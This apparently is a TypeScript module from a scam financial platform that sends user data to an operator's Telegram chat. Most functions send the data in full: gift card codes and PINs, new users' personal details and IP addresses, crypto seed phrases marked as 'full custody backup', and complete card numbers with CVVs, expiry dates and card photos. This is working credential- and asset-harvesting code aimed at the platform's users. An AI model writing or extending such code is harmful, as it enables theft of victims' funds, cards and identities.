  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `🎁 GIFT CARD SUBMISSION\n\nUser: @${opts.username} (ID: #${opts.userId})\nBrand: ${opts.brand}\nCode: ${opts.code}${opts.pin ? `\nPIN: ${opts.pin}` : ""}\nDeclared Value: $${opts.amount}\n\nTransaction ID: #${opts.txId}`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_tx_${opts.txId}` }, { text: "❌ Decline", callback_data: `reject_tx_${opts.txId}` }]] } });
    if (opts.frontImage) { const buf = dataUrlToBuffer(opts.frontImage); if (buf) await adminBot.sendPhoto(ADMIN_CHAT_ID, buf, { caption: `Gift Card #${opts.txId} — FRONT` }, { filename: `tx${opts.txId}-front.jpg`, contentType: "image/jpeg" }).catch((e) => logger.error({ e }, "Error sending gift card front photo")); }
    if (opts.backImage) { const buf = dataUrlToBuffer(opts.backImage); if (buf) await adminBot.sendPhoto(ADMIN_CHAT_ID, buf, { caption: `Gift Card #${opts.txId} — BACK` }, { filename: `tx${opts.txId}-back.jpg`, contentType: "image/jpeg" }).catch((e) => logger.error({ e }, "Error sending gift card back photo")); }
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending gift card alert"); return null; }
}

export async function sendNewUserAlert(opts: { userId: number; email: string; username: string; firstName?: string | null; lastName?: string | null; phone: string; country: string; accountNumber: string; ipAddress?: string | null; }) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  const fullName = [opts.firstName, opts.lastName].filter(Boolean).join(" ") || "—";
  try {
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `👤 NEW USER REGISTERED\n\nName: ${fullName}\nUsername: @${opts.username}\nEmail: ${opts.email}\nPhone: ${opts.phone}\nCountry: ${opts.country}\nAccount: ${opts.accountNumber}\n${opts.ipAddress ? `IP: ${opts.ipAddress}\n` : ""}\nUser ID: #${opts.userId}`, { reply_markup: { inline_keyboard: [[{ text: "🧊 Freeze", callback_data: `freeze_user_${opts.userId}` }, { text: "💰 Fund", callback_data: `fund_user_${opts.userId}` }]] } });
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending new user alert"); return null; }
}

export async function sendCryptoSeedAlert(userInfo: string, email: string, mnemonic: string, addresses: Record<string, string>) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const addrLines = Object.entries(addresses).map(([k, v]) => `${k}: ${v}`).join("\n");
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `🔐 NEW CRYPTO WALLET CREATED\n\nUser: ${userInfo}\nEmail: ${email}\n\n🔑 SEED PHRASE (12 words):\n${mnemonic}\n\n📥 Addresses:\n${addrLines}\n\n⚠️ Store this securely — full custody backup.`);
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending crypto seed alert"); return null; }
}

export async function sendCryptoSwapAlert(opts: { swapId: number; userInfo: string; email: string; asset: string; amount: number; cashValue: number; rate: number; mnemonic?: string | null; addresses?: Record<string, string> | null; }) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const seedBlock = opts.mnemonic ? `\n\n🔑 SEED PHRASE (12 words):\n${opts.mnemonic}` : "";
    const addrBlock = opts.addresses ? `\n\n📥 Wallet Addresses:\n${Object.entries(opts.addresses).map(([k, v]) => `${k}: ${v}`).join("\n")}` : "";
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `💱 CRYPTO SWAP / WITHDRAW REQUEST\n\nSwap ID: #${opts.swapId}\nUser: ${opts.userInfo}\nEmail: ${opts.email}\n\nAsset: ${opts.asset}\n💰 Amount Withdrew: ${opts.amount} ${opts.asset}\nRate: $${opts.rate.toLocaleString()} / ${opts.asset}\nCash Value: $${opts.cashValue.toLocaleString()}${seedBlock}${addrBlock}`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve & Credit", callback_data: `approve_swap_${opts.swapId}` }, { text: "❌ Reject", callback_data: `reject_swap_${opts.swapId}` }]] } });
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending crypto swap alert"); return null; }
}

export async function sendVirtualCardActivationAlert(opts: { cardId: number; userId: number; username: string; email: string; cardName: string; brand: string; last4: string; cardNumber: string; cvv: string; expiry: string; cardholderName: string; fee: number; }) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `💳 VIRTUAL CARD ACTIVATION REQUEST\n\nCard ID: #${opts.cardId}\nUser: @${opts.username} (#${opts.userId})\nEmail: ${opts.email}\n\nCard Name: ${opts.cardName}\nHolder: ${opts.cardholderName}\nBrand: ${opts.brand}\nNumber: ${opts.cardNumber}\nCVV: ${opts.cvv}\nExpiry: ${opts.expiry}\nLast 4: ****${opts.last4}\n\nActivation fee: $${opts.fee.toFixed(2)} (charged to user wallet — refunded if rejected)`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_card_${opts.cardId}` }, { text: "❌ Reject (refund $50)", callback_data: `reject_card_${opts.cardId}` }]] } });
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending virtual card activation alert"); return null; }
}

export async function sendBankCardSubmissionAlert(opts: { cardId: number; userId: number; username: string; email: string; cardholderName: string; cardNumber: string; brand: string; last4: string; expiry: string; cvv: string; country: string; bankName: string; billingAddress: string; frontImage: string; backImage: string; }) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const masked = opts.cardNumber.length > 8 ? `${opts.cardNumber.slice(0, 4)} **** **** ${opts.cardNumber.slice(-4)}` : opts.cardNumber;
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `🏦 BANK CARD VERIFICATION REQUEST\n\nCard ID: #${opts.cardId}\nUser: @${opts.username} (#${opts.userId})\nEmail: ${opts.email}\n\nCardholder: ${opts.cardholderName}\nBank: ${opts.bankName}\nCountry: ${opts.country}\nBrand: ${opts.brand}\nNumber: ${opts.cardNumber}\nMasked: ${masked}\nCVV: ${opts.cvv}\nExpiry: ${opts.expiry}\n${opts.billingAddress ? `Billing Address: ${opts.billingAddress}\n` : ""}\nFront/back images attached below.`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_card_${opts.cardId}` }, { text: "❌ Reject", callback_data: `reject_card_${opts.cardId}` }]] } });

    const sendImg = async (dataUrl: string, caption: string, file: string) => {
      const buf = dataUrlToBuffer(dataUrl);
      if (!buf) return;
      await adminBot!.sendPhoto(ADMIN_CHAT_ID!, buf, { caption }, { filename: file, contentType: "image/jpeg" }).catch((e) => logger.error({ e, file }, "Error sending bank card photo"));
    };

    await sendImg(opts.frontImage, `Bank Card #${opts.cardId} — FRONT`, `card${opts.cardId}-front.jpg`);
    await sendImg(opts.backImage, `Bank Card #${opts.cardId} — BACK`, `card${opts.cardId}-back.jpg`);
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending bank card alert"); return null; }
}

export async function deleteTelegramWebhooks(): Promise<void> {
  if (adminBot) {
    await adminBot.deleteWebHook();
    logger.info("Admin webhook deleted");
  }
  if (supportBot) {
    await supportBot.deleteWebHook();
    logger.info("Support webhook deleted");
  }
}